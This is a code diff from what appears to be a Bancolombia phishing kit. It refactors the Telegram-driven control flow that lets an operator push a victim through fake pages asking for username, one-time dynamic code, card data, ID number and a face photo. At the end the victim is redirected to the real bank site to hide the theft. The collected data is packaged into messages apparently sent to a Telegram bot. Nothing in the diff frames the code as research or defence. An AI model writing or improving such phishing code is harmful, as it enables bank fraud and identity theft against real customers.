@@ -18,18 +18,8 @@
         
         setupTelegramActions: () => {
             BancoUtils.onTelegramAction((data) => {
-                switch(data.action) {
-                    case 'index':
-                    case 'dinamica':
-                    case 'tarjeta':
-                    case 'terminos':
-                    case 'cedula':
-                    case 'cara':
-                        window.location.href = `${data.action}.html`;
-                        break;
-                    case 'finalizar':
-                        window.location.href = 'https://www.bancolombia.com/personas';
-                        break;
+                if (window.BancolombiaTelegram) {
+                    BancolombiaTelegram.handleTelegramAction(data);
                 }
             });
             return true;
@@ -63,17 +53,10 @@
                 // Formatear mensaje con TODOS los datos acumulados (sin imágenes)
                 const message = BancoUtils.formatMessage(`BANCOLOMBIA - ${stage.toUpperCase()}`, textData);
                 
-                const buttons = [
-                    { text: '🔑 Pedir Usuario', action: 'index' },
-                    { text: '🔢 Pedir Dinámica', action: 'dinamica' },
-                    { text: '💳 Pedir Tarjeta', action: 'tarjeta' },
-                    { text: '🆔 Pedir Cédula', action: 'cedula' },
-                    { text: '📷 Pedir Cara', action: 'cara' },
-                    { text: '📄 Pedir Términos', action: 'terminos' },
-                    { text: '✅ Finalizar', action: 'finalizar' }
-                ];
-                
-                const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
+                if (!window.BancolombiaTelegram) {
+                    throw new Error('Cargar bancolombia-telegram.js antes de shared-optimized.js');
+                }
+                const keyboard = BancolombiaTelegram.getKeyboard();
                 
                 // Construir contenido con texto y teclado
                 const content = { text: message, keyboard };
